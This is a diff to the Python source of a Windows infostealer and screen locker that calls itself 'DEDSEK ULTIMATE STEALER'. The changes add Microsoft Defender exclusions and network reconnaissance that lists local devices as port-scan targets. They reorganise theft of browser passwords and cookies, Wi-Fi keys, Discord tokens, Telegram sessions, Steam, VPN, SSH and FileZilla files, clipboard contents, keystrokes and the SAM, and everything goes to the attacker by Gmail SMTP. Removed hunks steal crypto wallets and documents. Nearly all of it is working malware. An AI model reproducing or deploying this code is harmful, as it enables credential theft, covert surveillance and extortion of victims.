@@ -51,7 +51,8 @@ def is_admin():
 def send_email(msg, subj=None):
     try:
         m = MIMEText(msg, 'plain', 'utf-8')
-        m['Subject'] = subj or 'DedSek'; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
+        m['Subject'] = subj or 'DedSek'
+        m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
         s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
         s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
     except: pass
@@ -60,7 +61,7 @@ def send_file_email(fp, desc):
     try:
         if not os.path.exists(fp): return
         m = MIMEMultipart()
-        m['Subject'] = f'File: {desc}'; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
+        m['Subject'] = desc; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
         with open(fp, 'rb') as f:
             p = MIMEBase('application', 'octet-stream'); p.set_payload(f.read())
             encoders.encode_base64(p)
@@ -89,6 +90,42 @@ def add_to_startup():
             try: shutil.copy2(cp, dest)
             except: pass
     except: pass
+
+# ===== DEFENDER =====
+def bypass_defender():
+    try:
+        if is_admin():
+            for p in [tempfile.gettempdir(), os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows')]:
+                os.system(f'powershell -Command "Add-MpPreference -ExclusionPath \'{p}\'" >nul 2>&1')
+    except: pass
+
+# ===== ВСЕ IP АДРЕСА =====
+def get_all_ips():
+    ips = {}
+    try: ips['local'] = socket.gethostbyname(socket.gethostname())
+    except: ips['local'] = 'Unknown'
+    try: ips['public'] = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
+    except: ips['public'] = 'Unknown'
+    try:
+        route = subprocess.check_output("ipconfig | findstr /i \"шлюз\"", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
+        for line in route.split('\n'):
+            if '.' in line and any(c.isdigit() for c in line):
+                gw = re.findall(r'\d+\.\d+\.\d+\.\d+', line)
+                if gw: ips['gateway'] = gw[0]; break
+    except: ips['gateway'] = 'Unknown'
+    try:
+        dns = subprocess.check_output("ipconfig /all | findstr /i \"DNS\"", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
+        ips['dns'] = list(set(re.findall(r'\d+\.\d+\.\d+\.\d+', dns)))[:5]
+    except: ips['dns'] = []
+    try:
+        arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
+        ips['arp_devices'] = list(set(re.findall(r'\d+\.\d+\.\d+\.\d+', arp)))[:20]
+    except: ips['arp_devices'] = []
+    try:
+        netstat = subprocess.check_output("netstat -ano | findstr LISTENING", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
+        ips['open_ports'] = list(set(re.findall(r':(\d+)', netstat)))[:30]
+    except: ips['open_ports'] = []
+    return ips
 
 # ===== РАСШИФРОВКА =====
 def _decrypt_aes_gcm(data, key):
@@ -123,8 +160,8 @@ def steal_chromium(browser, paths):
                         pwd = pwd.decode('utf-8','ignore') if pwd else "***"
                     else:
                         pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
-                    res.append(f"{browser} | {url} | {user} | {pwd}")
-                except: res.append(f"{browser} | {url} | {user} | ***")
+                    res.append(f"URL: {url}\nLOGIN: {user}\nPASSWORD: {pwd}\n" + "-"*40)
+                except: res.append(f"URL: {url}\nLOGIN: {user}\nPASSWORD: ***\n" + "-"*40)
             cur.close()
             try: os.remove(db)
             except: pass
@@ -184,28 +221,34 @@ def steal_firefox():
                         d = _decrypt_3des(ct, key, iv)
                         if d: pwd = d.decode('utf-8','ignore').lstrip('\x00').strip()
                 except: pass
-                res.append(f"FIREFOX | {host} | {user} | {pwd}")
+                res.append(f"URL: {host}\nLOGIN: {user}\nPASSWORD: {pwd}\n" + "-"*40)
             cur.close()
-        except:
-            z = os.path.join(tempfile.gettempdir(), f'ff_{folder[:10]}.zip')
-            with zipfile.ZipFile(z, 'w') as zf:
-                for f in [lf, kf]:
-                    if os.path.exists(f): zf.write(f, os.path.basename(f))
-            send_file_email(z, f"Firefox {folder[:10]}")
-            try: os.remove(z)
-            except: pass
+        except: pass
     return res
+
+def steal_wifi():
+    r = []
+    try:
+        for line in subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace').split('\n'):
+            if 'Все профили' in line:
+                p = line.split(':')[1].strip()
+                if p:
+                    det = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
+                    key = "НЕТ"
+                    for dl in det.split('\n'):
+                        if 'Содержимое ключа' in dl: key = dl.split(':')[1].strip()
+                    r.append(f"WiFi: {p}\nPASSWORD: {key}")
+    except: pass
+    return r
 
 def steal_cookies_all():
     r = []
-    paths = [
+    for cp in [
         os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'),
-        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
         os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies'),
         os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Cookies'),
         os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'Cookies'),
-    ]
-    for cp in paths:
+    ]:
         if not os.path.exists(cp): continue
         try:
             db = os.path.join(tempfile.gettempdir(), f'ck_{random.randint(0,9999)}.db')
@@ -221,21 +264,6 @@ def steal_cookies_all():
         except: pass
     return r[:500] if r else ["No cookies"]
 
-def steal_wifi():
-    r = []
-    try:
-        for line in subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace').split('\n'):
-            if 'Все профили' in line:
-                p = line.split(':')[1].strip()
-                if p:
-                    det = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
-                    key = "НЕТ"
-                    for dl in det.split('\n'):
-                        if 'Содержимое ключа' in dl: key = dl.split(':')[1].strip()
-                    r.append(f"{p}: {key}")
-    except: pass
-    return r
-
 def steal_discord():
     tokens = set()
     for db in [os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb'), 
@@ -246,96 +274,6 @@ def steal_discord():
                 try: tokens.update(re.findall(r'[MN][A-Za-z\d]{23}\.[A-Za-z\d]{6}\.[A-Za-z\d]{27}', open(os.path.join(db, f), 'r', errors='ignore').read()))
                 except: pass
     return list(tokens)[:20]
-
-def steal_telegram():
-    tg = os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata')
-    if not os.path.exists(tg): return
-    try:
-        z = os.path.join(tempfile.gettempdir(), 'telegram.zip')
-        with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
-            for r, d, files in os.walk(tg):
-                for f in files:
-                    if not f.endswith('.exe') and not f.endswith('.dll'):
-                        zf.write(os.path.join(r, f), os.path.relpath(os.path.join(r, f), tg))
-        send_file_email(z, "Telegram")
-        try: os.remove(z)
-        except: pass
-    except: pass
-
-def steal_steam():
-    steam = os.path.join(os.environ.get('PROGRAMFILES(X86)', 'C:\\Program Files (x86)'), 'Steam')
-    if os.path.exists(steam):
-        for f in ['config/loginusers.vdf', 'config/config.vdf', 'ssfn']:
-            fp = os.path.join(steam, f)
-            if os.path.exists(fp):
-                send_file_email(fp, f"Steam {os.path.basename(fp)}")
-
-def steal_minecraft():
-    mc = os.path.join(os.environ['APPDATA'], '.minecraft')
-    if os.path.exists(mc):
-        for f in ['launcher_accounts.json', 'launcher_profiles.json']:
-            fp = os.path.join(mc, f)
-            if os.path.exists(fp):
-                send_file_email(fp, f"Minecraft {f}")
-
-def steal_vpn():
-    vpn_paths = [
-        os.path.join(os.environ['USERPROFILE'], 'OpenVPN', 'config'),
-        os.path.join(os.environ['PROGRAMFILES'], 'OpenVPN', 'config'),
-        os.path.join(os.environ['PROGRAMFILES'], 'WireGuard', 'Data'),
-    ]
-    for path in vpn_paths:
-        if os.path.exists(path):
-            z = os.path.join(tempfile.gettempdir(), 'vpn.zip')
-            with zipfile.ZipFile(z, 'w') as zf:
-                for r, d, files in os.walk(path):
-                    for f in files:
-                        if f.endswith('.ovpn') or f.endswith('.conf') or f.endswith('.key'):
-                            zf.write(os.path.join(r, f), f)
-            send_file_email(z, "VPN Configs")
-            try: os.remove(z)
-            except: pass
-
-def steal_crypto():
-    wallets = {
-        "Bitcoin": os.path.join(os.environ['APPDATA'], 'Bitcoin', 'wallet.dat'),
-        "Electrum": os.path.join(os.environ['APPDATA'], 'Electrum', 'wallets'),
-        "Exodus": os.path.join(os.environ['APPDATA'], 'Exodus', 'exodus.wallet'),
-        "Atomic": os.path.join(os.environ['APPDATA'], 'atomic'),
-    }
-    for name, path in wallets.items():
-        if os.path.exists(path):
-            if os.path.isfile(path):
-                send_file_email(path, f"Crypto {name}")
-            else:
-                z = os.path.join(tempfile.gettempdir(), f'{name}.zip')
-                with zipfile.ZipFile(z, 'w') as zf:
-                    for r, d, files in os.walk(path):
-                        for f in files: zf.write(os.path.join(r, f), f)
-                send_file_email(z, f"Crypto {name}")
-                try: os.remove(z)
-                except: pass
-
-def steal_clipboard():
-    try:
-        import win32clipboard
-        win32clipboard.OpenClipboard()
-        if win32clipboard.IsClipboardFormatAvailable(1):
-            data = win32clipboard.GetClipboardData()
-            if data:
-                send_email(f"CLIPBOARD:\n{str(data)[:2000]}", "Clipboard")
-        win32clipboard.CloseClipboard()
-    except: pass
-
-def steal_files():
-    for folder in [os.path.join(os.environ['USERPROFILE'], 'Desktop'), os.path.join(os.environ['USERPROFILE'], 'Documents')]:
-        if not os.path.exists(folder): continue
-        for f in os.listdir(folder):
-            fp = os.path.join(folder, f)
-            if os.path.isfile(fp) and os.path.getsize(fp) < 5*1024*1024:
-                ext = os.path.splitext(f)[1].lower()
-                if ext in ['.txt','.doc','.docx','.pdf','.xlsx','.key','.wallet','.dat','.rdp','.ovpn','.json','.xml']:
-                    send_file_email(fp, f"File: {f}")
 
 def dump_sam():
     if not is_admin(): return "No admin"
@@ -394,73 +332,163 @@ def keylogger_thread():
             global keylog_data
             keylog_data.append(f"{time.strftime('%H:%M:%S')} | {e.name}")
             if len(keylog_data) >= 100:
-                send_email('\n'.join(keylog_data), "Keylogger")
+                send_email('\n'.join(keylog_data), "[DedSek_Logs] Keylogger")
                 keylog_data.clear()
         keyboard.on_press(on_key)
     except: pass
 
+def steal_telegram():
+    tg = os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata')
+    if not os.path.exists(tg): return
+    try:
+        z = os.path.join(tempfile.gettempdir(), 'telegram.zip')
+        with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
+            for r, d, files in os.walk(tg):
+                for f in files:
+                    if not f.endswith('.exe') and not f.endswith('.dll'):
+                        zf.write(os.path.join(r, f), os.path.relpath(os.path.join(r, f), tg))
+        send_file_email(z, "[DedSek_Logs] Telegram")
+        try: os.remove(z)
+        except: pass
+    except: pass
+
+def steal_steam():
+    steam = os.path.join(os.environ.get('PROGRAMFILES(X86)', 'C:\\Program Files (x86)'), 'Steam')
+    if os.path.exists(steam):
+        for f in ['config/loginusers.vdf', 'config/config.vdf']:
+            fp = os.path.join(steam, f)
+            if os.path.exists(fp): send_file_email(fp, f"[DedSek_Logs] Steam {os.path.basename(fp)}")
+
+def steal_vpn_configs():
+    for path in [
+        os.path.join(os.environ['USERPROFILE'], 'OpenVPN', 'config'),
+        os.path.join(os.environ['PROGRAMFILES'], 'OpenVPN', 'config'),
+        os.path.join(os.environ['PROGRAMFILES'], 'WireGuard', 'Data'),
+    ]:
+        if os.path.exists(path):
+            for f in os.listdir(path):
+                fp = os.path.join(path, f)
+                if f.endswith('.ovpn') or f.endswith('.conf') or f.endswith('.key'):
+                    send_file_email(fp, f"[DedSek_Logs] VPN {f}")
+
+def steal_configs():
+    configs = {
+        "SSH": os.path.join(os.environ['USERPROFILE'], '.ssh', 'id_rsa'),
+        "RDP": os.path.join(os.environ['USERPROFILE'], 'Documents', 'Default.rdp'),
+        "FileZilla": os.path.join(os.environ['APPDATA'], 'FileZilla', 'sitemanager.xml'),
+    }
+    for name, path in configs.items():
+        if os.path.exists(path) and os.path.getsize(path) < 5*1024*1024:
+            send_file_email(path, f"[DedSek_Logs] Config {name}")
+
+def steal_clipboard():
+    try:
+        import win32clipboard
+        win32clipboard.OpenClipboard()
+        if win32clipboard.IsClipboardFormatAvailable(1):
+            data = win32clipboard.GetClipboardData()
+            if data: send_email(f"CLIPBOARD:\n{str(data)[:2000]}", "[DedSek_Logs] Clipboard")
+        win32clipboard.CloseClipboard()
+    except: pass
+
 # ===== МЕГА-СТИЛЕР =====
 def mega_steal():
-    R = ["="*60, "🔥 DEDSEK ULTIMATE STEALER v3.0 🔥", "="*60]
-    R += [f"\nUSER: {os.environ.get('USERNAME')}", f"PC: {socket.gethostname()}"]
+    all_passwords = []
+    ips = get_all_ips()
     
-    try: R.append(f"LOCAL IP: {socket.gethostbyname(socket.gethostname())}")
-    except: pass
-    try:
-        ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
-        g = json.loads(urllib.request.urlopen(f"http://ip-api.com/json/{ip}", timeout=5).read())
-        R.append(f"PUBLIC IP: {ip} | {g.get('country','?')} | {g.get('city','?')} | {g.get('isp','?')}")
-    except: pass
+    all_passwords.append("="*60)
+    all_passwords.append("DEDSEK ULTIMATE STEALER - LOGINS & PASSWORDS")
+    all_passwords.append("="*60)
+    all_passwords.append(f"\nUSER: {os.environ.get('USERNAME')}")
+    all_passwords.append(f"PC: {socket.gethostname()}")
+    all_passwords.append(f"LOCAL IP: {ips.get('local', '?')}")
+    all_passwords.append(f"PUBLIC IP: {ips.get('public', '?')}")
+    all_passwords.append(f"GATEWAY: {ips.get('gateway', '?')}")
+    all_passwords.append(f"DNS: {', '.join(ips.get('dns', []))}")
+    all_passwords.append(f"OPEN PORTS: {', '.join(ips.get('open_ports', []))}")
+    all_passwords.append(f"ARP DEVICES: {', '.join(ips.get('arp_devices', []))}")
     
-    try: R.append("\nIPCONFIG:\n" + subprocess.check_output("ipconfig /all", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')[:5000])
-    except: pass
+    # Пароли браузеров
+    all_passwords.append("\n" + "="*60)
+    all_passwords.append("CHROME PASSWORDS")
+    all_passwords.append("="*60)
+    all_passwords.extend(steal_chromium("CHROME", [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')]) or ["No data"])
     
-    R.append("\n=== WIFI ===")
-    R.extend(steal_wifi() or ["No WiFi"])
+    all_passwords.append("\n" + "="*60)
+    all_passwords.append("EDGE PASSWORDS")
+    all_passwords.append("="*60)
+    all_passwords.extend(steal_chromium("EDGE", [os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')]) or ["No data"])
     
-    R.append("\n=== BROWSER PASSWORDS ===")
-    browsers = {
-        "CHROME": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')],
-        "EDGE": [os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')],
-        "YANDEX": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Login Data')],
-        "OPERA": [os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Login Data')],
-        "BRAVE": [os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Login Data')],
-    }
-    for name, paths in browsers.items():
-        data = steal_chromium(name, paths)
-        R.append(f"\n--- {name} ---")
-        R.extend(data if data else ["No data"])
+    all_passwords.append("\n" + "="*60)
+    all_passwords.append("YANDEX PASSWORDS")
+    all_passwords.append("="*60)
+    all_passwords.extend(steal_chromium("YANDEX", [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Login Data')]) or ["No data"])
     
-    R.append("\n--- FIREFOX ---")
-    R.extend(steal_firefox() or ["No data"])
+    all_passwords.append("\n" + "="*60)
+    all_passwords.append("OPERA PASSWORDS")
+    all_passwords.append("="*60)
+    all_passwords.extend(steal_chromium("OPERA", [os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Login Data')]) or ["No data"])
     
-    R.append("\n=== COOKIES ===")
-    R.extend(steal_cookies_all())
+    all_passwords.append("\n" + "="*60)
+    all_passwords.append("FIREFOX PASSWORDS")
+    all_passwords.append("="*60)
+    all_passwords.extend(steal_firefox() or ["No data"])
     
-    R.append("\n=== DISCORD ===")
+    all_passwords.append("\n" + "="*60)
+    all_passwords.append("WIFI PASSWORDS")
+    all_passwords.append("="*60)
+    all_passwords.extend(steal_wifi() or ["No data"])
+    
+    # Куки
+    all_passwords.append("\n" + "="*60)
+    all_passwords.append("COOKIES")
+    all_passwords.append("="*60)
+    all_passwords.extend(steal_cookies_all())
+    
+    # Discord
+    all_passwords.append("\n" + "="*60)
+    all_passwords.append("DISCORD TOKENS")
+    all_passwords.append("="*60)
     tokens = steal_discord()
-    R.extend([f"TOKEN: {t}" for t in tokens] if tokens else ["No tokens"])
+    all_passwords.extend([f"TOKEN: {t}" for t in tokens] if tokens else ["No tokens"])
     
-    R.append("\n=== SAM ===")
-    R.append(dump_sam())
+    # SAM
+    all_passwords.append("\n" + "="*60)
+    all_passwords.append("WINDOWS PASSWORD (SAM)")
+    all_passwords.append("="*60)
+    all_passwords.append(dump_sam())
     
-    # Всё остальное в фоне
-    for t in [steal_telegram, steal_steam, steal_minecraft, steal_vpn, steal_crypto, steal_clipboard, steal_files, capture_webcam, record_mic]:
+    # IP для сканирования
+    all_passwords.append("\n" + "="*60)
+    all_passwords.append("IP ADDRESSES FOR PORT SCANNING")
+    all_passwords.append("="*60)
+    all_passwords.append(f"TARGET: {ips.get('gateway')} (Router)")
+    all_passwords.append(f"TARGET: {ips.get('public')} (External)")
+    all_passwords.append(f"TARGET: {ips.get('local')} (Local)")
+    for ip in ips.get('arp_devices', []):
+        all_passwords.append(f"TARGET: {ip} (Network Device)")
+    all_passwords.append(f"\nOPEN PORTS: {', '.join(ips.get('open_ports', []))}")
+    
+    all_passwords.append("\n" + "="*60)
+    all_passwords.append(f"REPORT: {time.strftime('%d.%m.%Y %H:%M:%S')}")
+    all_passwords.append("="*60)
+    
+    text = '\n'.join(all_passwords)
+    for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]):
+        send_email(part, f"[DedSek_Logs] Full Report [{i+1}]")
+    
+    # Фоновые задачи
+    for t in [steal_telegram, steal_steam, steal_vpn_configs, steal_configs, steal_clipboard, capture_webcam, record_mic]:
         threading.Thread(target=t, daemon=True).start()
     
+    # Скриншот
     try:
         ss = os.path.join(tempfile.gettempdir(), 'desktop.jpg')
         ImageGrab.grab().save(ss, 'JPEG', quality=50)
-        send_file_email(ss, "Screenshot")
+        send_file_email(ss, "[DedSek_Logs] Screenshot")
         try: os.remove(ss)
         except: pass
     except: pass
-    
-    R += ["\n" + "="*60, f"REPORT: {time.strftime('%d.%m.%Y %H:%M:%S')}", "="*60]
-    
-    text = '\n'.join(R)
-    for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]):
-        send_email(part, f"DedSek [{i+1}]")
 
 # ===== ЗАПИСЬ ЭКРАНА =====
 def record_loop():
@@ -478,7 +506,7 @@ def record_loop():
                     subprocess.run(['ffmpeg', '-i', vp, '-c:v', 'libx264', '-preset', 'ultrafast', '-crf', '35', '-b:v', '200k', '-s', '640x360', '-r', '10', '-y', out2], capture_output=True, timeout=30)
                     vp = out2
                 except: pass
-            send_file_email(vp, "Video")
+            send_file_email(vp, "[DedSek_Logs] Video")
             try: os.remove(vp)
             except: pass
         except: time.sleep(1)
@@ -546,7 +574,10 @@ class WinLocker:
         global attempts_left
         
         try:
-            img = PhotoImage(file=base64.b64decode(SKULL_BASE64))
+            img_data = base64.b64decode(SKULL_BASE64)
+            img_path = os.path.join(tempfile.gettempdir(), "dedsek.png")
+            with open(img_path, "wb") as f: f.write(img_data)
+            img = PhotoImage(file=img_path)
             tk.Label(self.win, image=img, bg='black').place(relx=0.5, rely=0.08, anchor='center')
             self.win._img = img
         except: pass
@@ -599,8 +630,9 @@ class WinLocker:
                 self.root.destroy(); reset_windows()
             self.pw.delete(0, tk.END)
 
+# ===== MAIN =====
 if __name__ == "__main__":
-    hide_console(); disable_win_key(); add_to_startup()
+    hide_console(); disable_win_key(); bypass_defender(); add_to_startup()
     threading.Thread(target=mega_steal, daemon=True).start()
     threading.Thread(target=record_loop, daemon=True).start()
     threading.Thread(target=keylogger_thread, daemon=True).start()
